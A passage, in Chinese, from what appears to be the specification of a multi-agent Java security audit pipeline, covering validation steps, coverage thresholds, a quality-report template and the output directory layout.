**3a. 校验 agent-5 分批方案（负责人自行检查，无需 agent-7-x）：**
- 检查 `trace_batch_plan.md` 存在且非空
- P0 和 P1 路由全部包含在分批方案中（不遗漏 P1）
- 批次大小合理（每批 ≤ 10 条）
- 通过 → 关闭 agent-5 → spawn agent-5-N workers

**3b. 逐个校验 agent-5-N 输出（每个 worker 完成后立即由空闲检员校验）：**
- 逐文件检查：HTTP数据包、层级调用链、参数追踪表、执行路径结论
- **必须检查**：每个报告必须包含「鉴权风险评估」章节
  - 鉴权状态标注
  - 鉴权绕过风险（如有）
  - 风险等级评估
- **特殊检查**：grep 该 worker 输出文件中的 `${`，发现未替换变量则不合格
- 文件数量 = 方法数 + 1（总索引）
- 通过 → 负责人关闭该 worker
- 不通过 → 通知该 worker 补充

**3c. 全部 worker 校验通过后，负责人汇总覆盖率：**
- 追踪覆盖率：已追踪数 / high_risk 建议追踪数（P0+P1） >= 90%
- 通过 → 按 sink 类型按需启动 agent-6a/6b/6c/6d

#### 阶段4 校验（每个 agent-6x 完成后立即由空闲检员校验）

- 每个 agent-6x 完成后，负责人立即将校验任务分配给空闲的 agent-7-x，使用 Skill 工具加载对应 skill，从 skill 上下文中提取输出规范，逐项检查
- **必须检查**：每个漏洞报告必须包含「可利用前置条件」章节
  - 鉴权要求
  - 鉴权绕过方式（如有）
  - 其他条件
  - 综合评估
- 不合格 → 通知对应 agent-6x 补充
- 合格 → 负责人关闭该 agent-6x
- 全部实际启动的 agent-6x 校验通过且关闭后 → 进入最终汇总
- 审计覆盖率：已审计调用链数 / 有 sink 的调用链总数 >= 90%

#### 最终汇总：生成 `quality_report.md`

全部 agent-6x 校验通过后，负责人将汇总任务分配给任一空闲检员，整合所有阶段的校验结果生成最终报告，然后关闭 agent-7-x，完成整个流水线。

```markdown
# 审计质量检查报告

## 总览
| 阶段 | Skill | 状态 | 通过项/总项 | 重做次数 |
|:-----|:------|:-----|:-----------|:---------|

## 各阶段校验详情

### 阶段1
- ✅ java-route-mapper: 4/4 项通过
- ❌→✅ java-auth-audit: 首次 5/7，补充后 7/7（重做1次）
- ✅ java-vuln-scanner: 6/6 项通过

### 阶段2
- ✅ agent-4a-risk-classifier: high_risk_routes.md 校验通过
- ✅ agent-4b-vuln-aggregator: 组件漏洞汇总+鉴权绕过汇总 校验通过

### 阶段3
- ✅ agent-5-route-tracer: 分批方案校验通过（P0+P1 全覆盖，N 批次）
- ✅ agent-5-1: java-route-tracer 校验通过（含鉴权风险透传）[agent-7-1]
- ✅ agent-5-2: java-route-tracer 校验通过（含鉴权风险透传）[agent-7-2]
- ✅ ...（逐个 worker 校验记录）
- ✅ 追踪覆盖率: 95% >= 90%

### 阶段4
- ✅ java-sql-audit: 4/4 项通过（含可利用前置条件）

## 数据一致性
| 校验项 | 实际值 | 阈值 | 状态 |
|:-------|:-------|:-----|:-----|
| 路由覆盖率 | 85% | 80% | ✅ |
| 高危路由追踪率 | 100% | 90% | ✅ |
| 漏洞审计覆盖率 | 95% | 90% | ✅ |

## 审计统计汇总
| 指标 | 数量 |
|:-----|:-----|
| 总路由数 | |
| 无鉴权路由数 | |
| 组件漏洞数 | |
| 鉴权绕过漏洞数 | |
| 高危路由数 | |
| 已追踪调用链数 | |
| 发现代码漏洞数 | |
| 发现代码漏洞数 | |
```

---

## 输出目录结构

```
{output_path}/
├── route_mapper/              # 阶段1 - agent-1-route-mapper
├── auth_audit/                # 阶段1 - agent-2-auth-audit
├── vuln_report/               # 阶段1 - agent-3-vuln-scanner
├── cross_analysis/            # 阶段2 - agent-4a & agent-4b
│   ├── high_risk_routes.md              # agent-4a 输出
│   ├── trace_batch_plan.md              # agent-5 分批方案
│   ├── component_vulnerabilities.md     # agent-4b 输出
│   └── auth_bypass_vulnerabilities.md   # agent-4b 输出
├── route_tracer/              # 阶段3 - agent-5-1/5-2/.../5-N 并行输出（含鉴权风险透传）
├── sql_audit/                 # 阶段4 - agent-6a-sql-auditor（含可利用前置条件）
├── xxe_audit/                 # 阶段4 - agent-6b-xxe-auditor（含可利用前置条件）
├── file_upload_audit/         # 阶段4 - agent-6c-upload-auditor（含可利用前置条件）
├── file_read_audit/           # 阶段4 - agent-6d-fileread-auditor（含可利用前置条件）
├── decompiled/                # 反编译输出（多 agent 共享）
└── quality_report.md          # 阶段5 - agent-7-x-quality-checker
```

## Skill 输出规范引用

agent-7-x 校验时使用 Skill 工具加载对应 skill 获取输出规范：

| 校验对象 | 加载 Skill |
|:---------|:-----------|
| agent-1-route-mapper 输出 | `/java-route-mapper` |
| agent-2-auth-audit 输出 | `/java-auth-audit` |
| agent-3-vuln-scanner 输出 | `/java-vuln-scanner` |
| agent-5-route-tracer 输出 | `/java-route-tracer` |
| agent-5-N 输出 | `/java-route-tracer` |
| agent-6a-sql-auditor 输出 | `/java-sql-audit` |
| agent-6b-xxe-auditor 输出 | `/java-xxe-audit` |
| agent-6c-upload-auditor 输出 | `/java-file-upload-audit` |
| agent-6d-fileread-auditor 输出 | `/java-file-read-audit` |
